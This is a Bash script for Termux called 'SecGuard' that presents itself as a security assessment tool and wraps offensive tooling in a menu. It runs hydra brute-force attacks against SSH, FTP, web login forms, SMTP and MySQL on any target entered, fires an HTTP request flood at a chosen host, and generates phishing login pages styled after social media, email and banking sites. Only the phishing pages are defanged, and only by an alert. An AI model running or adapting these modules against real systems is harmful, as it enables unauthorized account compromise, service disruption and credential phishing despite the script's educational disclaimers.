#!/bin/bash

# SecGuard - Multi-Purpose Security Assessment Tool
# Version: 1.0
# Created by: Security Researcher
# For educational and authorized testing purposes only

# Colors for better UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Check if running on Termux
if [ ! -d "/data/data/com.termux/files/home" ]; then
    echo -e "${RED}[!] This script is designed to run on Termux.${NC}"
    exit 1
fi

# Banner function
display_banner() {
    clear
    echo -e "${BLUE}"
    echo "  ███████╗███████╗ ██████╗  ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ "
    echo "  ██╔════╝██╔════╝██╔════╝ ██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗"
    echo "  ███████╗█████╗  ██║      ██║  ███╗██║   ██║███████║██████╔╝██║  ██║"
    echo "  ╚════██║██╔══╝  ██║      ██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║"
    echo "  ███████║███████╗╚██████╗ ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝"
    echo "  ╚══════╝╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ "
    echo -e "${NC}"
    echo -e "${YELLOW}      Multi-Purpose Security Assessment Tool - v1.0${NC}"
    echo -e "${RED}      For educational and authorized testing purposes only${NC}"
    echo -e "${CYAN}      ----------------------------------------${NC}"
    echo ""
}

# Dependencies check function
check_dependencies() {
    dependencies=("nmap" "hydra" "python" "wget" "curl" "tor" "proxychains-ng" "tcpdump")
    missing_deps=()
    
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null && ! pkg list-installed | grep -q "$dep"; then
            missing_deps+=("$dep")
        fi
    done
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing dependencies: ${missing_deps[*]}${NC}"
        read -p "Do you want to install them now? (y/n): " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+] Installing missing dependencies...${NC}"
            pkg update
            for dep in "${missing_deps[@]}"; do
                echo -e "${CYAN}[*] Installing $dep...${NC}"
                pkg install -y "$dep"
            done
            echo -e "${GREEN}[+] Dependencies installed successfully.${NC}"
        else
            echo -e "${RED}[!] The tool may not function properly without required dependencies.${NC}"
        fi
    else
        echo -e "${GREEN}[+] All dependencies are installed.${NC}"
    fi
}

# Vulnerability scanning function
vulnerability_scan() {
    echo -e "${CYAN}[*] Vulnerability Scanning Module${NC}"
    echo -e "${YELLOW}----------------------------${NC}"
    
    read -p "Enter target IP or domain: " target
    
    if [ -z "$target" ]; then
        echo -e "${RED}[!] Target cannot be empty.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Select scan type:${NC}"
    echo "1. Quick scan (common ports)"
    echo "2. Full port scan"
    echo "3. Service version detection"
    echo "4. OS detection"
    echo "5. Vulnerability script scan"
    read -p "Enter your choice: " scan_type
    
    echo -e "${GREEN}[+] Starting scan on $target...${NC}"
    
    case $scan_type in
        1)
            nmap -F -T4 "$target" -oN "quick_scan_$target.txt"
            ;;
        2)
            nmap -p- -T4 "$target" -oN "full_scan_$target.txt"
            ;;
        3)
            nmap -sV -T4 "$target" -oN "service_scan_$target.txt"
            ;;
        4)
            nmap -O "$target" -oN "os_scan_$target.txt"
            ;;
        5)
            nmap --script vuln "$target" -oN "vuln_scan_$target.txt"
            ;;
        *)
            echo -e "${RED}[!] Invalid option.${NC}"
            return
            ;;
    esac
    
    echo -e "${GREEN}[+] Scan completed. Results saved to scan_$target.txt${NC}"
}

# Brute force attack function
brute_force_attack() {
    echo -e "${CYAN}[*] Brute Force Attack Module${NC}"
    echo -e "${YELLOW}---------------------------${NC}"
    
    read -p "Enter target IP or domain: " target
    
    if [ -z "$target" ]; then
        echo -e "${RED}[!] Target cannot be empty.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Select service to attack:${NC}"
    echo "1. SSH"
    echo "2. FTP"
    echo "3. HTTP/Web Form"
    echo "4. SMTP"
    echo "5. MySQL"
    read -p "Enter your choice: " service_type
    
    read -p "Enter username (or username list file): " username
    
    echo -e "${YELLOW}[*] Password list options:${NC}"
    echo "1. Use default wordlist (rockyou-small.txt)"
    echo "2. Use custom wordlist file"
    echo "3. Create simple custom wordlist"
    read -p "Enter your choice: " pass_option
    
    if [ "$pass_option" == "1" ]; then
        # Check if the default wordlist exists, if not download a sample
        if [ ! -f "rockyou-small.txt" ]; then
            echo -e "${YELLOW}[*] Downloading sample wordlist...${NC}"
            curl -s -o rockyou-small.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
        fi
        password_list="rockyou-small.txt"
    elif [ "$pass_option" == "2" ]; then
        read -p "Enter path to wordlist file: " password_list
        if [ ! -f "$password_list" ]; then
            echo -e "${RED}[!] Wordlist file not found.${NC}"
            return
        fi
    elif [ "$pass_option" == "3" ]; then
        read -p "Enter base words separated by space: " base_words
        read -p "Enter optional numbers to append (leave blank for none): " numbers
        
        password_list="custom_wordlist.txt"
        > "$password_list" # Create or clear file
        
        for word in $base_words; do
            echo "$word" >> "$password_list"
            if [ ! -z "$numbers" ]; then
                for num in $(seq 1 "$numbers"); do
                    echo "$word$num" >> "$password_list"
                done
            fi
        done
        echo -e "${GREEN}[+] Created custom wordlist with $(wc -l < "$password_list") entries.${NC}"
    else
        echo -e "${RED}[!] Invalid option.${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Starting brute force attack...${NC}"
    
    case $service_type in
        1) # SSH
            hydra -l "$username" -P "$password_list" ssh://"$target" -t 4
            ;;
        2) # FTP
            hydra -l "$username" -P "$password_list" ftp://"$target" -t 4
            ;;
        3) # HTTP/Web Form - simplified example
            read -p "Enter login page path (e.g., /login.php): " login_path
            read -p "Enter form parameters (e.g., username=^USER^&password=^PASS^): " form_params
            read -p "Enter failure message (text that appears when login fails): " fail_msg
            hydra -l "$username" -P "$password_list" "$target" http-post-form "$login_path:$form_params:F=$fail_msg" -t 4
            ;;
        4) # SMTP
            hydra -l "$username" -P "$password_list" smtp://"$target" -t 4
            ;;
        5) # MySQL
            hydra -l "$username" -P "$password_list" mysql://"$target" -t 4
            ;;
        *)
            echo -e "${RED}[!] Invalid option.${NC}"
            return
            ;;
    esac
    
    echo -e "${GREEN}[+] Brute force attack completed.${NC}"
}

# DoS attack simulation function
dos_attack_simulation() {
    echo -e "${CYAN}[*] DoS Attack Simulation Module${NC}"
    echo -e "${YELLOW}-------------------------------${NC}"
    echo -e "${RED}[!] Warning: This module is for educational purposes only.${NC}"
    echo -e "${RED}[!] Using this against unauthorized targets is illegal.${NC}"
    
    read -p "Do you confirm you have permission to test this target? (yes/no): " confirmation
    if [ "$confirmation" != "yes" ]; then
        echo -e "${RED}[!] Operation cancelled.${NC}"
        return
    fi
    
    read -p "Enter target IP or domain: " target
    
    if [ -z "$target" ]; then
        echo -e "${RED}[!] Target cannot be empty.${NC}"
        return
    fi
    
    read -p "Enter target port (default: 80): " port
    port=${port:-80}
    
    echo -e "${YELLOW}[*] Select DoS method:${NC}"
    echo "1. HTTP Flood (low bandwidth, more effective on web servers)"
    echo "2. TCP SYN Flood simulation (demonstration only)"
    echo "3. Ping Flood simulation (ICMP, demonstration only)"
    read -p "Enter your choice: " dos_method
    
    read -p "Enter duration in seconds (max 30 for demo): " duration
    if [ "$duration" -gt 30 ]; then
        duration=30
        echo -e "${YELLOW}[*] Duration limited to 30 seconds for demonstration.${NC}"
    fi
    
    echo -e "${GREEN}[+] Starting simulated DoS attack for $duration seconds...${NC}"
    
    case $dos_method in
        1) # HTTP Flood
            end_time=$((SECONDS + duration))
            requests=0
            
            while [ $SECONDS -lt $end_time ]; do
                curl -s -o /dev/null "$target:$port" &
                requests=$((requests + 1))
                
                # Limit to reasonable demonstration rate
                if [ $((requests % 10)) -eq 0 ]; then
                    echo -e "${CYAN}[*] Sent $requests requests${NC}"
                    sleep 0.1
                fi
            done
            
            # Kill any remaining curl processes
            pkill -f "curl -s -o /dev/null $target:$port" 2>/dev/null
            echo -e "${GREEN}[+] HTTP flood demonstration completed. Sent $requests requests.${NC}"
            ;;
            
        2) # TCP SYN Flood simulation
            echo -e "${YELLOW}[*] This is a simulated TCP SYN flood demonstration${NC}"
            echo -e "${YELLOW}[*] In a real test, specialized tools would be used${NC}"
            
            # Simulate with a visual display
            packets=0
            chars=( "|" "/" "-" "\\" )
            end_time=$((SECONDS + duration))
            
            while [ $SECONDS -lt $end_time ]; do
                for char in "${chars[@]}"; do
                    echo -ne "\r${CYAN}[*] Simulating SYN packets $char [packets: $packets]${NC}"
                    packets=$((packets + 5))
                    sleep 0.2
                done
            done
            echo -e "\n${GREEN}[+] SYN flood simulation completed.${NC}"
            ;;
            
        3) # Ping Flood simulation
            echo -e "${YELLOW}[*] This is a simulated ping flood demonstration${NC}"
            ping_count=$((duration * 2))
            
            # Use ping with limited count instead of actual flood
            ping -c $ping_count "$target" > ping_result.txt
            echo -e "${GREEN}[+] Ping test completed. Results saved to ping_result.txt${NC}"
            ;;
            
        *)
            echo -e "${RED}[!] Invalid option.${NC}"
            return
            ;;
    esac
    
    echo -e "${GREEN}[+] DoS simulation completed. This was a limited demonstration.${NC}"
    echo -e "${YELLOW}[*] A real DoS attack would be much more powerful and is illegal against unauthorized targets.${NC}"
}

# Phishing simulation function
phishing_simulation() {
    echo -e "${CYAN}[*] Phishing Simulation Module${NC}"
    echo -e "${YELLOW}----------------------------${NC}"
    echo -e "${RED}[!] Warning: This module is for educational purposes only.${NC}"
    echo -e "${RED}[!] Using this for actual phishing is illegal.${NC}"
    
    echo -e "${YELLOW}[*] Select template type:${NC}"
    echo "1. Social Media Login"
    echo "2. Email Provider Login"
    echo "3. Banking Portal (Demonstration)"
    echo "4. Generic Login Page"
    echo "5. Custom Template"
    read -p "Enter your choice: " template_type
    
    local_port=8080
    
    echo -e "${GREEN}[+] Setting up phishing simulation environment...${NC}"
    
    # Create a directory for the phishing page
    mkdir -p phishing_demo
    cd phishing_demo
    
    # Create simple HTML template based on selection
    case $template_type in
        1) # Social Media Template
            cat > index.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>Social Media Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); width: 396px; }
        .logo { text-align: center; margin-bottom: 20px; color: #1877f2; font-size: 36px; font-weight: bold; }
        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { background-color: #1877f2; color: white; width: 100%; padding: 14px; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .divider { margin: 20px 0; border-bottom: 1px solid #dadde1; }
        .footer { text-align: center; margin-top: 20px; color: #777; }
        a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Social Network</div>
        <form id="login-form">
            <input type="text" placeholder="Email or phone number" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider"></div>
        <div style="text-align: center;">
            <a href="#">Forgot password?</a>
        </div>
        <div class="footer">
            <p>This is a demonstration of a phishing page for educational purposes only.</p>
            <p>Real phishing is illegal and unethical.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('DEMO ONLY: In a real phishing attack, credentials would be captured. This is for educational awareness.');
        });
    </script>
</body>
</html>
EOL
            ;;
            
        2) # Email Provider Template
            cat > index.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>Email Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background-color: white; padding: 48px 40px 36px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 450px; }
        .logo { text-align: center; margin-bottom: 24px; font-size: 24px; color: #202124; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 32px; text-align: center; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 24px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #1a73e8; color: white; width: 100%; padding: 12px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 12px; }
        .footer { text-align: center; margin-top: 40px; color: #5f6368; font-size: 14px; }
        a { color: #1a73e8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Mail Service</div>
        <h1>Sign in</h1>
        <form id="login-form">
            <input type="email" placeholder="Email or phone" required>
            <input type="password" placeholder="Password" required>
            <div style="text-align: left; margin-bottom: 32px;">
                <a href="#">Forgot password?</a>
            </div>
            <button type="submit">Next</button>
        </form>
        <div class="footer">
            <p>This is a demonstration of a phishing page for educational purposes only.</p>
            <p>Real phishing is illegal and unethical.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('DEMO ONLY: In a real phishing attack, credentials would be captured. This is for educational awareness.');
        });
    </script>
</body>
</html>
EOL
            ;;
            
        3) # Banking Portal Template
            cat > index.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>Secure Banking Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f9f9f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background-color: white; padding: 30px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 400px; }
        .logo { text-align: center; margin-bottom: 30px; color: #146C94; font-size: 24px; font-weight: bold; }
        .secure-badge { background-color: #e7f4e4; color: #0a6522; padding: 8px; border-radius: 4px; display: flex; align-items: center; margin-bottom: 20px; }
        .secure-badge svg { margin-right: 8px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #146C94; color: white; width: 100%; padding: 12px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .divider { margin: 20px 0; border-bottom: 1px solid #eee; }
        .footer { text-align: center; margin-top: 20px; color: #777; font-size: 14px; }
        a { color: #146C94; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Secure Bank</div>
        <div class="secure-badge">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
            </svg>
            Secure Connection
        </div>
        <form id="login-form">
            <label for="userid">User ID</label>
            <input type="text" id="userid" required>
            <label for="password">Password</label>
            <input type="password" id="password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="divider"></div>
        <div style="text-align: center;">
            <a href="#">Forgot User ID?</a> | <a href="#">Forgot Password?</a>
        </div>
        <div class="footer">
            <p>This is a demonstration of a phishing page for educational purposes only.</p>
            <p>Real phishing is illegal and unethical.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('DEMO ONLY: In a real phishing attack, credentials would be captured. This is for educational awareness.');
        });
    </script>
</body>
</html>
EOL
            ;;
            
        4) # Generic Login Template
            cat > index.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>Account Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background-color: white; padding: 25px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); width: 350px; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 28px; font-weight: bold; }
        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #007bff; color: white; width: 100%; padding: 10px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; color: #6c757d; font-size: 14px; }
        a { color: #007bff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ACME Services</div>
        <form id="login-form">
            <input type="text" placeholder="Username" required>
            <input type="password" placeholder="Password" required>
            <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
                <label><input type="checkbox"> Remember me</label>
                <a href="#">Forgot password?</a>
            </div>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
            <p>This is a demonstration of a phishing page for educational purposes only.</p>
            <p>Real phishing is illegal and unethical.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('DEMO ONLY: In a real phishing attack, credentials would be captured. This is for educational awareness.');
        });
    </script>
</body>
</html>
EOL
            ;;
            
        5) # Custom Template
            echo -e "${YELLOW}[*] A basic template will be created. You would customize this in a real scenario.${NC}"
            cat > index.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background-color: white; padding: 25px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); width: 350px; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 24px; }
        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #007bff; color: white; width: 100%; padding: 10px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; color: #6c757d; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Custom Login</div>
        <form id="login-form">
            <input type="text" placeholder="Username" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            <p>This is a demonstration of a phishing page for educational purposes only.</p>
            <p>Real phishing is illegal and unethical.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('DEMO ONLY: In a real phishing attack, credentials would be captured. This is for educational awareness.');
        });
    </script>
</body>
</html>
EOL
            ;;
            
        *)
            echo -e "${RED}[!] Invalid option.${NC}"
            cd ..
            return
            ;;
    esac
    
    # Start a simple HTTP server to demonstrate the phishing page
    echo -e "${GREEN}[+] Starting web server on port $local_port...${NC}"
    echo -e "${YELLOW}[*] Access the demonstration phishing page at: http://localhost:$local_port${NC}"
    echo -e "${RED}[!] Remember: This is for educational purposes only. Creating actual phishing pages is illegal.${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop the server when finished.${NC}"
    
    # Use Python's built-in HTTP server
    python -m http.server $local_port
    
    # Clean up
    cd ..
    echo -e "${GREEN}[+] Phishing simulation stopped.${NC}"
}

# Network analysis function
network_analysis() {
    echo -e "${CYAN}[*] Network Analysis Module${NC}"
    echo -e "${YELLOW}-------------------------${NC}"
    
    # Check if tcpdump is available
    if ! command -v tcpdump &> /dev/null; then
        echo -e "${RED}[!] tcpdump is not installed. Please install it first.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Select analysis type:${NC}"
    echo "1. Capture packets on all interfaces"
    echo "2. Capture packets on specific interface"
    read -p "Enter your choice: " analysis_type
    
    case $analysis_type in
        1) # Capture on all interfaces
            echo -e "${GREEN}[+] Starting packet capture on all interfaces...${NC}"
            tcpdump -i any -w capture_all.pcap
            ;;
        2) # Capture on specific interface
            read -p "Enter interface name (e.g., wlan0): " interface
            echo -e "${GREEN}[+] Starting packet capture on interface $interface...${NC}"
            tcpdump -i $interface -w capture_$interface.pcap
            ;;
        *)
            echo -e "${RED}[!] Invalid option.${NC}"
            return
            ;;
    esac
    
    echo -e "${GREEN}[+] Packet capture completed. File saved as capture.pcap${NC}"
}

# Main menu function
main_menu() {
    display_banner
    check_dependencies
    
    while true; do
        echo -e "${CYAN}[*] Main Menu${NC}"
        echo -e "${YELLOW}----------------${NC}"
        echo "1. Vulnerability Scanning"
        echo "2. Brute Force Attack"
        echo "3. DoS Attack Simulation"
        echo "4. Phishing Simulation"
        echo "5. Network Analysis"
        echo "6. Exit"
        read -p "Enter your choice: " choice
        
        case $choice in
            1)
                vulnerability_scan
                ;;
            2)
                brute_force_attack
                ;;
            3)
                dos_attack_simulation
                ;;
            4)
                phishing_simulation
                ;;
            5)
                network_analysis
                ;;
            6)
                echo -e "${GREEN}[+] Exiting SecGuard. Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option. Please try again.${NC}"
                ;;
        esac
        
        read -p "Press Enter to continue..."
    done
}

# Start the tool
main_menu
